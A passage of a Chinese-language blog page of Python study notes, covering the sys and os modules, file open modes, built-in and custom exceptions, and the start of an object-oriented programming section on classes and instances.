data-num=\"42\"></td><td><pre>    <span class=\"token comment\">#返回一个列表</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    dirs <span class=\"token operator\">=</span> glob<span class=\"token punctuation\">.</span>glob<span class=\"token punctuation\">(</span><span class=\"token string\">'*.py'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dirs<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">SYS_study</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">argvfun</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        pycharm中设置参数 shift + Alt + F10</pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        '''</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        my_argv <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>argv</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> my_argv<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">pathfun</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        获取指定模块搜索路径的字符串集合，可以将写好的模块放在得到的某个路径下，就可以在程序中import时正确找到。</pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        '''</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">sys_stdout_writefun</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        打印刷新</pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        其关键就在于使用'\\r'这个转义字符（回到行首），</pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        '''</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        s <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>            e <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>            sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\r正在打印&#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>e <span class=\"token operator\">-</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">OS_STUDY</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">getfun</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>        <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"81\"></td><td><pre>        列出目前工作目录</pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        '''</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>getcwd<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">absfun</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"86\"></td><td><pre>        取得绝对路径</pre></td></tr><tr><td data-num=\"87\"></td><td><pre>        os.path.abspath(path)</pre></td></tr><tr><td data-num=\"88\"></td><td><pre>        传回path的绝对路径</pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        '''</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>abspath<span class=\"token punctuation\">(</span><span class=\"token string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#列出上一层工作目录的绝对路径</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>abspath<span class=\"token punctuation\">(</span><span class=\"token string\">'sys_os_module.py'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#列出当前文件的绝对路径</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    code <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    <span class=\"token comment\"># s = SYS_study()</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>    <span class=\"token comment\"># s.pathfun()</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>    <span class=\"token comment\"># s.sys_stdout_writefun()</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>    o <span class=\"token operator\">=</span> OS_STUDY<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>    <span class=\"token comment\"># o.getfun()</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>    <span class=\"token comment\"># o.absfun()</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>    <span class=\"token comment\"># print (os.sep)  # 输出当前操作系统的路径分隔符</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>    <span class=\"token comment\"># print (os.system ('ipconfig'))  # 运行 shell 命令，直接显示</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>    <span class=\"token comment\"># print (os.path.exists ('b.txt'))  # 如果 path 存在则返回 true，否则返回 false</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>    <span class=\"token comment\"># os.path.isabs (path)  # 如果 path 是绝对路径则返回 true</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>    <span class=\"token comment\"># os.path.isfile (path)  # 如果 path 是一个存在的文件返回 true，否则返回 false</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>    <span class=\"token comment\"># os.path.isdir (path)  # 如果 path 是一个存在的目录则返回 true，否则返回 false</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>    <span class=\"token triple-quoted-string string\">'''os.path.join() 有用  '''</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    <span class=\"token comment\"># os.path.join (pthh1, path2, [...])  # 将多个路径组合后返回。参数可以有 2 到多个</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>    <span class=\"token comment\">#os.listdir (path), 以列表的方式列出特定工作目录的内容</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>    <span class=\"token comment\"># print(os.listdir('.'))</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    <span class=\"token comment\"># globmodule()</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>    <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"116\"></td><td><pre>    os.mkdir(path) 建立path目录</pre></td></tr><tr><td data-num=\"117\"></td><td><pre>    os.rmdir(path) 删除path目录 ,但只能是空目录</pre></td></tr><tr><td data-num=\"118\"></td><td><pre>    os.remove(path) 删除指定文件</pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    os.chdir(path) 更改到path工作目录</pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    '''</span></pre></td></tr></table></figure><p>记一些常用的重要方法。</p>\n<h1 id=\"文件读写\"><a class=\"anchor\" href=\"#文件读写\">#</a> 文件读写</h1>\n<h2 id=\"打开模式\"><a class=\"anchor\" href=\"#打开模式\">#</a> 打开模式</h2>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:right\">模式</th>\n<th style=\"text-align:right\">操作</th>\n<th style=\"text-align:right\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:right\">r</td>\n<td style=\"text-align:right\">只读</td>\n<td style=\"text-align:right\">默认模式，如果文件不存在就报错，存在就正常读取。</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">w</td>\n<td style=\"text-align:right\">只写</td>\n<td style=\"text-align:right\">如果文件不存在，新建文件然后写入；如果存在，先清空文件内容，再写入。</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">a</td>\n<td style=\"text-align:right\">追加</td>\n<td style=\"text-align:right\">如果文件不存在，新建文件，然后写入；如果存在，在文件的最后追加写入。</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">x</td>\n<td style=\"text-align:right\">新建</td>\n<td style=\"text-align:right\">如果文件存在则报错，如果不存在就新建文件，然后写入内容，比 w 模式更安全。</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">b</td>\n<td style=\"text-align:right\">二进制模式</td>\n<td style=\"text-align:right\">比如 rb、wb、ab，以 bytes 类型操作数据</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">+</td>\n<td style=\"text-align:right\">读写模式</td>\n<td style=\"text-align:right\">比如 r+、w+、a+</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"文本文件和二进制文件的差异和区别\"><a class=\"anchor\" href=\"#文本文件和二进制文件的差异和区别\">#</a> 文本文件和二进制文件的差异和区别</h2>\n<p>详细见：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9hZjBiNGY4YjAzMGU=\">https://www.jianshu.com/p/af0b4f8b030e</span></p>\n<p>1、不管什么文件，物理存储都是二进制数据。（计算机对他们读取方式是有区别的。要详细了解他们的区别，比较复杂，这里就不去考虑的这么具体）</p>\n<p>2、两者  能存储的数据类型不同：</p>\n<p>a、文本文件只能存储 char 型字符变量。（每条数据都是固定长度的）</p>\n<p>b、二进制文件可以存储 char/int/short/long/float/…… 各种变量值。（进制文件每条数据不固定）</p>\n<p>怎么理解一条数据呢： char 型字符，就是每一个字符就是一条数据。而 int 型字符，就是一个数字就是一条数据。比如：数字 11，使用 char 型编码会把它 分成 两个字符 1，分别编码。而 int 型就是把它当成一个数字编码。</p>\n<h1 id=\"异常处理\"><a class=\"anchor\" href=\"#异常处理\">#</a> 异常处理</h1>\n<h2 id=\"常见的异常基类\"><a class=\"anchor\" href=\"#常见的异常基类\">#</a> 常见的异常基类</h2>\n<p>BaseException: 所有异常的基类 都是这个类派生的</p>\n<p>Exception: 常规错误的基类</p>\n<p>ZeroDivisionError: 除（或取模）零（所有数据类型）</p>\n<p>AssertionError: 断言语句失败</p>\n<p>AttributeError: 对象没有这个属性</p>\n<p>ImportError: 导入模块 / 对象失败</p>\n<p>LookupError: 无效数据查询的基类</p>\n<p>IndexError: 序列中没有此索引（index）</p>\n<p>KeyError: 映射中没有这个键</p>\n<p>NameError: 未声明 / 初始化对象（没有属性）</p>\n<p>SyntaxError:python 语法错误</p>\n<p>IndentationError: 缩进错误</p>\n<p>TypeError: 传入无效的参数</p>\n<p>UnicodeError:Unicode 相关的错误</p>\n<p>UnicodeDecodeError:Unicode 解码时的错误</p>\n<p>UnicodeEncodeError:Unicode 编码时的错误</p>\n<p>UnicodeTranslateError:Unicode 转换时的错误</p>\n<p>Warning: 警告的基类</p>\n<p>SyntaxWarning: 可疑的语法的警告</p>\n<p>转载自：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NDkxMzc2L2FydGljbGUvZGV0YWlscy8xMDY3NjA0MjA=\">https://blog.csdn.net/qq_38491376/article/details/106760420</span></p>\n<p>内置异常已经够用了，但是有时候你还是需要自定义一些异常。自定义异常应该继承 Exception 类，直接继承或者间接继承都可以，例如:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">MyExcept</span><span class=\"token punctuation\">(</span>Exception<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        self<span class=\"token punctuation\">.</span>message <span class=\"token operator\">=</span> msg</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__str__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>message</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">raise</span> MyExcept<span class=\"token punctuation\">(</span><span class=\"token string\">'我的异常!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">except</span> MyExcept <span class=\"token keyword\">as</span> ex<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ex<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>异常的名字都以 Error 结尾，我们在为自定义异常命名的时候也需要遵守这一规范，就跟标准的异常命名一样。</p>\n<h2 id=\"异常的处理方式\"><a class=\"anchor\" href=\"#异常的处理方式\">#</a> 异常的处理方式</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#捕获异常</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    指令</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">except</span> 【（异常类型）】<span class=\"token punctuation\">:</span>  <span class=\"token comment\">#不加括号为捕获所有异常</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    异常处理程序</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    正确处理程序</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">finally</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    无论是否有异常发生，都执行<span class=\"token keyword\">finally</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>也可</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">except</span> 异常对象 <span class=\"token keyword\">as</span> e <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span>输出报错信息</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>断言(assert)</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>确保程序执行到某个阶段必须符合一定条件，如果不符合，则抛出异常，程序终止同时打印出异常原因</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    assert 条件 , '字符串' #报错的信息</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    条件响应为True则程序不理会逗号右边的字符串，将往下继续执行</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    条件响应为False，则程序终止，并将字符串输出到Traceback的字符串中</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>停用断言</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>想要停用断言，可以在Windows的操作命令提示符，执行程序的时候使用“ -O ” 选项停用断言</pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>主动抛出异常：raise</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>很多时候，我们需要主动抛出一个异常。Python内置了一个关键字raise，可以主动触发异常。</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">raise</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#0>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">raise</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>RuntimeError<span class=\"token punctuation\">:</span> No active exception to reraise</pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">raise</span> NameError<span class=\"token punctuation\">(</span><span class=\"token string\">\"kkk\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#1>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">raise</span> NameError<span class=\"token punctuation\">(</span><span class=\"token string\">\"kkk\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>NameError<span class=\"token punctuation\">:</span> kkk</pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">raise</span>唯一的一个参数指定了要被抛出的异常的实例，如果什么参数都不给，那么会默认抛出当前异常。</pre></td></tr></table></figure><h2 id=\"异常与错误的区别\"><a class=\"anchor\" href=\"#异常与错误的区别\">#</a> 异常与错误的区别</h2>\n<p>详细见：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p4ODcwMTIxMjA5L2FydGljbGUvZGV0YWlscy84MTQ3NzMyOQ==\">https://blog.csdn.net/zx870121209/article/details/81477329</span></p>\n<p>错误是无法通过其他代码进行处理问题，如语法错误和逻辑错误，语法错误是单词或格式等写错，只能根据系统提示去修改相应的代码，逻辑错误是代码实现功能的逻辑有问题，系统不会报错，也是只能找到相应的代码进行修改；</p>\n<p>异常是程序执行过程中，出现的未知问题，这里语法和逻辑都是正确的，可以通过其他代码进行处理修复，如可以通过 if 判定语句来避免对年龄进行赋值时输入了字符而出现异常的情况，如使用捕捉异常可以避免除零异常等</p>\n<h1 id=\"python面向对象\"><a class=\"anchor\" href=\"#python面向对象\">#</a> Python 面向对象</h1>\n<p>面向对象编程：Object Oriented Programming，简称 OOP，是一种程序设计方法。OOP 把对象作为程序的基本单元，一个对象包含了数据和操作数据的方法。Python 就是一种面向对象的语言，支持面向对象编程，在其内部，一切都被视作对象。</p>\n<p>面向过程的程序设计把计算机程序视为一系列的命令集合，即一组函数的顺序执行。为了简化程序设计，面向过程把函数继续切分为子函数，即把大块函数通过切割成小块函数来降低系统的复杂度。</p>\n<p>而面向对象的程序设计把计算机程序视为一组对象的集合，而每个对象都可以接收其他对象发过来的消息，并处理这些消息，计算机程序的执行就是一系列消息在各个对象之间传递。</p>\n<p>在 Python 中，所有数据类型都可以视为对象，当然也可以自定义对象。自定义的对象数据类型就是面向对象中的类（Class）的概念。</p>\n<p>数据封装、继承和多态是面向对象的三大特点</p>\n<p>一个对象的特征也称为属性（attribute）。它所具有的行为也称为方法（method）</p>\n<h2 id=\"概念及术语\"><a class=\"anchor\" href=\"#概念及术语\">#</a> 概念及术语：</h2>\n<ul>\n<li>类 (Class): 用来描述具有相同属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。其中的对象被称作类的实例。\n<ul>\n<li>实例：也称对象。通过类定义的初始化方法，赋予具体的值，成为一个 &quot;有血有肉的实体&quot;。</li>\n<li>实例化：创建类的实例的过程或操作。</li>\n<li>实例变量：定义在实例中的变量，只作用于当前实例。</li>\n<li>类变量：类变量是所有实例公有的变量。类变量定义在类中，但在方法体之外。</li>\n<li>数据成员：类变量、实例变量、方法、类方法、静态方法和属性等的统称。</li>\n<li>方法：类中定义的函数。</li>\n<li>静态方法：不需要实例化就可以由类执行的方法</li>\n<li>类方法：类方法是将类本身作为对象进行操作的方法。</li>\n<li>方法重写：如果从父类继承的方法不能满足子类的需求，可以对父类的方法进行改写，这个过程也称 override。</li>\n<li>封装：将内部实现包裹起来，对外透明，提供 api 接口进行调用的机制</li>\n<li>继承：即一个派生类（derived class）继承父类（base class）的变量和方法。</li>\n<li>多态：根据对象类型的不同以不同的方式进行处理。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"类与实例\"><a class=\"anchor\" href=\"#类与实例\">#</a> 类与实例</h2>\n<p>详细见：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGlhb3h1ZWZlbmcuY29tL3dpa2kvMTAxNjk1OTY2MzYwMjQwMC8xMDE3NDk2MDMxMTg1NDA4\">https://www.liaoxuefeng.com/wiki/1016959663602400/1017496031185408</span></p>\n<p>面向对象最重要的概念就是类（Class）和实例（Instance），必须牢记类是抽象的模板，比如 Student 类，而实例是根据类创建出来的一个个具体的 “对象”，每个对象都拥有相同的方法，但各自的数据可能不同。</p>\n<p>仍以 Student 类为例，在 Python 中，定义类是通过 class 关键字：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">pass</span></pre></td></tr></table></figure><p>class 后面紧接着是类名，即 Student，类名通常是大写开头的单词，紧接着是 (object)，表示该类是从哪个类继承下来的，继承的概念我们后面再讲，通常，如果没有合适的继承类，就使用 object 类，这是所有类最终都会继承的类。</p>\n<p>定义好了 Student 类，就可以根据 Student 类创建出 Student 的实例，创建实例是通过类名 +() 实现的：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart <span class=\"token operator\">=</span> Student<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span>__main__<span class=\"token punctuation\">.</span>Student <span class=\"token builtin\">object</span> at <span class=\"token number\">0x10a67a590</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> Student</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'__main__.Student'</span><span class=\"token operator\">></span></pre></td></tr></table></figure><p>可以看到，变量 bart 指向的就是一个 Student 的实例，后面的 0x10a67a590 是内存地址，每个 object 的地址都不一样，而 Student 本身则是一个类。</p>\n<p>可以自由地给一个实例变量绑定属性，比如，给实例 bart 绑定一个 name 属性：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> <span class=\"token string\">'Bart Simpson'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart<span class=\"token punctuation\">.</span>name</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token string\">'Bart Simpson'</span></pre></td></tr></table></figure><p>由于类可以起到模板的作用，因此，可以在创建实例的时候，把一些我们认为必须绑定的属性强制填写进去。通过定义一个特殊的__init__方法，在创建实例的时候，就把 name，score 等属性绑上去：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td 